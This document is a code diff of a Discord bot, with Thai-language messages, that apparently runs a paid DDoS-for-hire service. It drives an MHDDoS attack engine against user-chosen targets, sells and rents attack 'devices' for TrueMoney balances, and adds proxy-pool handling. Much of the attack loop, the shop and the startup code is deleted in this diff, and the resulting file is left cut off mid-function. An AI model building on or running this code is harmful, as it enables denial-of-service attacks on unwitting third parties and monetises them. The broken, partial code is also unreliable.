@@ -15,6 +15,7 @@ from config import (
     BASE_DIR, BOT_TOKEN, PREFIX, OWNER_ID, LOG_CHANNEL_ID,
     MAX_DURATION, MAX_DEVICES_PURCHASE, MAX_WARNINGS,
     FORBIDDEN_TLDS, FORBIDDEN_IPS,
+    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE,
 )
 from database import Database
 from mhddos_engine import MHDDoSEngine, L4_MODULES
@@ -77,11 +78,9 @@ def is_forbidden(target: str) -> bool:
     host = _extract_host(target)
     if not host:
         return False
-
     if any(host == tld.lstrip(".") or host.endswith(tld)
            for tld in FORBIDDEN_TLDS):
         return True
-
     try:
         ip = ipaddress.ip_address(host)
         if (ip.is_private or ip.is_loopback
@@ -89,7 +88,6 @@ def is_forbidden(target: str) -> bool:
             return True
     except ValueError:
         pass
-
     return host in FORBIDDEN_IPS
 
 
@@ -200,6 +198,18 @@ async def shop_panel(ctx):
     await ctx.send(**kwargs)
 
 
+@bot.command(name="proxy")
+async def proxy_status(ctx):
+    if not is_owner(ctx.author.id):
+        return
+    pool = len(proxy_mgr.proxies or [])
+    ready = "✅" if proxy_mgr.ready.is_set() else "⏳ กำลังโหลด"
+    await ctx.send(
+        f"**Proxy pool:** {pool} live {ready}\n"
+        f"**Sources:** {len(proxy_mgr.__class__.__dict__) and 2 or 0}"
+    )
+
+
 # ============================================================
 # Attack flow
 # ============================================================
@@ -287,429 +297,12 @@ async def start_attack(interaction: discord.Interaction, module: str,
 
     await interaction.response.defer(ephemeral=True)
 
-    # proxy — เขียนไฟล์แยกตาม user (ไฟล์เปล่า = ยิงตรง ไม่ใช้ proxy)
-    proxy_mgr.write_for_devices(user_id, devices)
-
-    # spawn
-    try:
-        proc = await engine.start(user_id, module, target,
-                                  port, duration, devices)
-    except Exception as e:
-        await interaction.followup.send(
-            f"เริ่มไม่สำเร็จ: {e}", ephemeral=True
-        )
-        return
-
-    # ครอบ log + followup — ถ้า fail → cleanup orphan
-    try:
+    # รอ proxy pool ถ้ายังไม่พร้อม — max 30 วิ
+    if not proxy_mgr.ready.is_set():
         try:
-            await db.log_attack(user_id, target, port, duration, module)
-        except Exception:
-            traceback.print_exc()
-
-        f = _file(ASSET_ATTACK_RUNNING)
-        embed = build_attack_running_embed(
-            target=f"{target}:{port}", time_left=duration,
-            speed="measuring...", module=module,
-            with_image=bool(f),
-        )
-        kwargs = {"embed": embed}
-        if f:
-            kwargs["file"] = f
-        msg = await interaction.followup.send(**kwargs)
-    except Exception as e:
-        await engine.stop(user_id)
-        traceback.print_exc()
-        try:
-            await interaction.followup.send(
-                f"สร้าง attack message ไม่สำเร็จ: {e}", ephemeral=True
-            )
-        except discord.HTTPException:
-            pass
-        return
-
-    state = {
-        "target": target, "port": port, "duration": duration,
-        "module": module, "devices": devices,
-        "start": time.time(), "message": msg, "proc": proc,
-        "has_image": bool(f),
-    }
-    active_attacks[user_id] = state
-    task = asyncio.create_task(_attack_loop(user_id, state))
-    state["task"] = task
-
-
-async def _attack_loop(user_id: int, state: dict):
-    msg: discord.WebhookMessage = state["message"]
-    proc = state["proc"]
-    target_full = f"{state['target']}:{state['port']}"
-    duration = state["duration"]
-    is_l4 = state["module"] in L4_MODULES
-
-    try:
-        while True:
-            elapsed = time.time() - state["start"]
-            left = max(0, duration - int(elapsed))
-
-            if left <= 0:
-                await engine.stop(user_id)
-                active_attacks.pop(user_id, None)
-                try:
-                    await msg.edit(embed=discord.Embed(
-                        title="✅ จบการโจมตี",
-                        color=discord.Color.green(),
-                        description=f"ยิง `{target_full}` ครบ {duration}s แล้ว",
-                    ))
-                except discord.HTTPException:
-                    pass
-                return
-
-            if proc.returncode is not None:
-                engine.running.pop(user_id, None)
-                active_attacks.pop(user_id, None)
-                try:
-                    await msg.edit(embed=discord.Embed(
-                        title="⚠️ Attack หยุดกลางทาง",
-                        description=f"MHDDoS exit code `{proc.returncode}`",
-                        color=discord.Color.orange(),
-                    ))
-                except discord.HTTPException:
-                    pass
-                return
-
-            if is_l4:
-                speed = "N/A (L4)"
-            else:
-                speed = await _measure_speed(state["target"], state["port"])
-
-            embed = build_attack_running_embed(
-                target=target_full, time_left=left,
-                speed=speed, module=state["module"],
-                with_image=state["has_image"],
-            )
-            try:
-                await msg.edit(embed=embed)
-            except discord.NotFound:
-                await engine.stop(user_id)
-                active_attacks.pop(user_id, None)
-                return
-            except discord.HTTPException:
-                pass
-
-            await asyncio.sleep(1)
-
-    except asyncio.CancelledError:
-        try:
-            await engine.stop(user_id)
-        except Exception:
-            pass
-        active_attacks.pop(user_id, None)
-        raise
-    except Exception:
-        traceback.print_exc()
-        engine.running.pop(user_id, None)
-        active_attacks.pop(user_id, None)
-
-
-async def _measure_speed(target: str, port: int) -> str:
-    if target.startswith("http"):
-        url = target
-    else:
-        scheme = "https" if port in (443, 8443) else "http"
-        url = f"{scheme}://{target}:{port}"
-    try:
-        start = time.time()
-        s = await http()
-        async with s.get(url) as r:
-            data = await r.read()
-        elapsed = max(0.001, time.time() - start)
-        ms = int(elapsed * 1000)
-        kbps = (len(data) / 1024) / elapsed
-        return f"{ms}ms / {kbps:.1f} KB/s"
-    except asyncio.CancelledError:
-        raise
-    except Exception:
-        return "offline / timeout"
-
-
-# ============================================================
-# !device / !b / !ub
-# ============================================================
-@bot.command(name="device")
-async def device_cmd(ctx, member: discord.Member = None,
-                     amount: str = None, duration: str = "TH"):
-    if not is_owner(ctx.author.id):
-        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-        return
-    if member is None or amount is None:
-        await ctx.send("ใช้: `!device @user +1 1h` (TH = ถาวร)")
-        return
-
-    sign = 1 if amount.startswith("+") else -1 if amount.startswith("-") else 1
-    try:
-        num = int(re.sub(r"[^0-9]", "", amount) or "0")
-    except ValueError:
-        await ctx.send("จำนวนไม่ถูกต้อง")
-        return
-    if num <= 0:
-        await ctx.send("จำนวนต้องมากกว่า 0")
-        return
-
-    if sign < 0:
-        await db.clear_rentals(member.id, num)
-        new = await db.add_devices(member.id, -num)
-        await ctx.send(f"ลบ {num} device จาก {member.mention} — เหลือ {new}")
-        return
-
-    new = await db.add_devices(member.id, num)
-    if duration.upper() == "TH":
-        await ctx.send(
-            f"เพิ่ม {num} device ให้ {member.mention} (ถาวร) — รวม {new}"
-        )
-        return
-
-    dur_lower = duration.lower()
-    try:
-        if dur_lower.endswith("m"):
-            secs = int(dur_lower[:-1]) * 60
-        elif dur_lower.endswith("h"):
-            secs = int(dur_lower[:-1]) * 3600
-        elif dur_lower.endswith("d"):
-            secs = int(dur_lower[:-1]) * 86400
-        else:
-            await ctx.send("รูปแบบเวลา: 30m / 1h / 1d / TH")
-            return
-    except ValueError:
-        await ctx.send("รูปแบบเวลา: 30m / 1h / 1d / TH")
-        return
-
-    if secs <= 0:
-        await ctx.send("เวลาต้องมากกว่า 0")
-        return
-
-    expires_at = int(time.time()) + secs
-    await db.add_rental(member.id, num, expires_at)
-    await ctx.send(
-        f"เพิ่ม {num} device ให้ {member.mention} ({duration}) — รวม {new}"
-    )
-
-
-@bot.command(name="b")
-async def ban_cmd(ctx, member: discord.Member):
-    if not is_owner(ctx.author.id):
-        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-        return
-    await db.set_ban(member.id, True)
-    await ctx.send(f"แบน {member.mention} แล้ว")
-
-
-@bot.command(name="ub")
-async def unban_cmd(ctx, member: discord.Member):
-    if not is_owner(ctx.author.id):
-        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-        return
-    await db.set_ban(member.id, False)
-    await ctx.send(f"ปลดแบน {member.mention} แล้ว")
-
-
-# ============================================================
-# Shop flows
-# ============================================================
-async def shop_device_type_selected(interaction: discord.Interaction,
-                                    mode: str):
-    if mode == "rent":
-        await interaction.response.edit_message(
-            content="เลือกช่วงเวลา:", embed=None, view=PeriodView()
-        )
-    else:
-        await interaction.response.edit_message(
-            content="เลือกจำนวน:", embed=None, view=QuantityView("buy")
-        )
-
-
-async def shop_period_selected(interaction: discord.Interaction, period: str):
-    await interaction.response.edit_message(
-        content=f"เลือกจำนวน (เช่า {period}):",
-        embed=None, view=QuantityView("rent", period),
-    )
-
-
-async def shop_quantity_selected(interaction: discord.Interaction, mode: str,
-                                 period: str | None, qty: int):
-    user_id = interaction.user.id
-    user = await db.get_user(user_id)
-    if not user:
-        await interaction.response.edit_message(
-            content="DB error", view=None
-        )
-        return
-
-    if mode == "rent":
-        if period is None:
-            await interaction.response.edit_message(
-                content="ไม่พบช่วงเวลา", view=None
-            )
-            return
-        price = RENT_PRICES.get(period, {}).get(qty)
-    else:
-        price = BUY_PRICES.get(qty)
-
-    if price is None:
-        await interaction.response.edit_message(
-            content="ไม่พบราคา", view=None
-        )
-        return
-
-    if user["balance"] < price:
-        await interaction.response.edit_message(
-            content=f"เงินไม่พอ (มี {user['balance']:.0f}💵 ต้องใช้ {price}💵)",
-            view=None,
-        )
-        return
-
-    if mode == "buy" and user["devices"] + qty > MAX_DEVICES_PURCHASE:
-        await interaction.response.edit_message(
-            content=f"ซื้อไม่เกิน {MAX_DEVICES_PURCHASE} device "
-                    f"(มีอยู่ {user['devices']})",
-            view=None,
-        )
-        return
-
-    await db.add_balance(user_id, -price, "purchase",
-                         f"{mode} {qty} {period or ''}")
-    new_dev = await db.add_devices(user_id, qty)
-
-    if mode == "rent":
-        secs = RENT_SECONDS.get(period, 0)
-        if secs:
-            await db.add_rental(user_id, qty, int(time.time()) + secs)
-
-    new_bal = (await db.get_user(user_id))["balance"]
-
-    try:
-        await interaction.user.send(
-            f"ซื้อสำเร็จ! ได้ {qty} device — รวม {new_dev} device\n"
-            f"เงินเหลือ {new_bal:.0f}💵"
-        )
-    except discord.Forbidden:
-        pass
-
-    await interaction.response.edit_message(
-        content=f"ซื้อสำเร็จ {qty} device — เหลือเงิน {new_bal:.0f}💵",
-        view=None,
-    )
-
-    log = bot.get_channel(LOG_CHANNEL_ID)
-    if log:
-        try:
-            await log.send(
-                f"🛒 **{interaction.user}** {mode} {qty} device "
-                f"({period or 'buy'}) — {price}💵 — เหลือ {new_bal:.0f}💵"
-            )
-        except discord.HTTPException:
+            await asyncio.wait_for(proxy_mgr.ready.wait(), timeout=30)
+        except asyncio.TimeoutError:
             pass
 
-
-# ============================================================
-# Topup (TrueMoney)
-# ============================================================
-async def process_topup(interaction: discord.Interaction, link: str):
-    await interaction.response.defer(ephemeral=True)
-    user_id = interaction.user.id
-
-    result = await tm.redeem(link)
-    if not result["success"]:
-        await interaction.followup.send(
-            "รับซองไม่สำเร็จ — เช็คลิงก์อีกครั้ง", ephemeral=True
-        )
-        return
-
-    amount = result["amount"]
-    new_bal = await db.add_balance(user_id, amount, "topup", link)
-    user = await db.get_user(user_id)
-    if user:
-        await db.update_user(
-            user_id, total_deposited=user["total_deposited"] + amount
-        )
-
-    await interaction.followup.send(
-        f"เติม {amount:.0f}💵 สำเร็จ — เหลือ {new_bal:.0f}💵",
-        ephemeral=True,
-    )
-
-    log = bot.get_channel(LOG_CHANNEL_ID)
-    if log:
-        try:
-            await log.send(
-                f"💰 **{interaction.user}** เติม {amount:.0f}💵 "
-                f"— เหลือ {new_bal:.0f}💵"
-            )
-        except discord.HTTPException:
-            pass
-
-
-@bot.command(name="topup")
-async def topup_cmd(ctx, link: str = None):
-    if not link:
-        await ctx.send("ใช้: `!topup <ลิงก์ซองทรูมันนี่>`")
-        return
-
-    result = await tm.redeem(link)
-    if not result["success"]:
-        await ctx.send("รับซองไม่สำเร็จ — ตรวจสอบลิงก์อีกครั้ง")
-        return
-
-    user_id = ctx.author.id
-    amount = result["amount"]
-    new_bal = await db.add_balance(user_id, amount, "topup", link)
-    user = await db.get_user(user_id)
-    if user:
-        await db.update_user(
-            user_id, total_deposited=user["total_deposited"] + amount
-        )
-
-    await ctx.send(f"เติมเงินสำเร็จ {amount:.0f}💵 — เหลือ {new_bal:.0f}💵")
-
-    log = bot.get_channel(LOG_CHANNEL_ID)
-    if log:
-        try:
-            await log.send(
-                f"💰 **{ctx.author}** เติม {amount:.0f}💵 — เหลือ {new_bal:.0f}💵"
-            )
-        except discord.HTTPException:
-            pass
-
-
-# ============================================================
-# Signal handler
-# ============================================================
-def _install_signal_handlers():
-    def _shutdown(sig, frame):
-        print(f"\n[VANTA] signal {sig} received — shutting down")
-        for uid, proc in list(engine.running.items()):
-            if proc.returncode is None:
-                try:
-                    proc.terminate()
-                except Exception:
-                    pass
-        raise SystemExit(0)
-
-    try:
-        signal.signal(signal.SIGINT, _shutdown)
-        signal.signal(signal.SIGTERM, _shutdown)
-    except ValueError:
-        pass
-
-
-# ============================================================
-# Run
-# ============================================================
-if __name__ == "__main__":
-    if not BOT_TOKEN or BOT_TOKEN.startswith("ใส่_"):
-        raise SystemExit(
-            "❌ BOT_TOKEN ยังไม่ได้ตั้ง — export BOT_TOKEN='...' ก่อนรัน"
-        )
-    os.makedirs(os.path.join(BASE_DIR, "data"), exist_ok=True)
-    os.makedirs(os.path.join(BASE_DIR, "assets"), exist_ok=True)
-    _install_signal_handlers()
-    bot.run(BOT_TOKEN)
+    # เตรียม proxy slices
+    sub_nodes = devices * SUB_NODES_PER_DEVICE
